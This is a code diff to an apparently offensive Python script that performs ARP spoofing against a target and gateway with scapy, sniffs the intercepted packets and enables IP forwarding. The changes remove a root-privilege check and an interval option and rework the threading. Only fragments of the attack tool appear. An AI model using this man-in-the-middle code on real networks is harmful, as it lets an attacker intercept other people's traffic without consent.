@@ -7,6 +7,8 @@ import subprocess
 from time import sleep
 from scapy.all import *
 import argparse
+import os 
+import sys
 
 # Global variables
 attacker_mac = ""
@@ -41,27 +43,6 @@ def print_success(message):
 def print_error(message):
     """Print error messages."""
     print(f"[!] {message}", file=sys.stderr)
-
-def get_own_ip_addresses():
-    """
-    Get all IPv4 addresses of the local machine that are not loopback.
-    
-    Returns:
-        list: A list of IP addresses.
-    """
-    ip_list = []
-    try:
-        interfaces = ni.interfaces()
-        for interface in interfaces:
-            if ni.AF_INET in ni.ifaddresses(interface):
-                for address in ni.ifaddresses(interface)[ni.AF_INET]:
-                    if 'addr' in address and address['addr'] != '127.0.0.1':
-                        ip_list.append(address['addr'])
-        return ip_list
-    except Exception as e:
-        print_error(f"Error getting IP addresses: {e}")
-        return []
-
  
 
 def get_own_mac_address(interface):
@@ -105,25 +86,16 @@ def packet_analyzer(packet):
         packet: The packet to analyze.
     """
     print("Packet captured")
-    if Ether in packet and IP in packet:
-            src_mac = packet[Ether].src
-            dst_mac = packet[Ether].dst
-            src_ip = packet[IP].src
-            dst_ip = packet[IP].dst
-            
-            print_status(f"Packet: {src_ip} ({src_mac}) -> {dst_ip} ({dst_mac})")
-            
-            for ip, mac in hacked_machines:
-                if ip == dst_ip:
-					# only works on linux and tested on ubuntu
-                        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    print(packet.summary())
+        
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
 def start_sniffer():
     """
     Start sniffing packets on the network.
     """
     print_status("Starting packet sniffer...")
-    sniff( prn=packet_analyzer)
+    sniff( prn=packet_analyzer, filter=f"ether host {attacker_mac}")
 
 
 def parse_arguments():
@@ -139,8 +111,6 @@ def parse_arguments():
     parser.add_argument("-g", "--gateway", help="Gateway IP address to spoof", required=True)
     parser.add_argument("-i", "--interface", help="Network interface to use", required=True)
     parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
-    parser.add_argument("--interval", type=int, default=2, help="Interval between spoofing packets in seconds (default: 2)")
-    
     return parser.parse_args()
 
 def main():
@@ -156,9 +126,7 @@ def main():
     print_success(f"Target IP: {args.target}")
     print_success(f"Gateway IP: {args.gateway}")
     print_success(f"Interface: {args.interface}")
-    print_success(f"Attacker MAC: {attacker_mac}")
-    print_success(f"Interval: {args.interval} seconds")
-    
+    print_success(f"Attacker MAC: {attacker_mac}")    
     print_status("Starting ARP spoofing...")
     victim_mac = getMacAddress(args.target)
     def start_spoofing():
@@ -167,21 +135,11 @@ def main():
             sleep(2)
 
     spoof_thread = threading.Thread(
-		target=start_spoofing(), args=())
+		target=start_spoofing)
     spoof_thread.start()
 
-    def start_sniffer():
-        while True:
-            start_sniffer()
     print_status("Starting packet sniffer...")
     sniffer_thread = threading.Thread(target=start_sniffer)
     sniffer_thread.start()
 
-
-if __name__ == "__main__":
-
-    if os.geteuid() != 0:
-        print_error("This script must be run as root (sudo). Exiting.")
-        sys.exit(1)
-    
-    main()
+main()
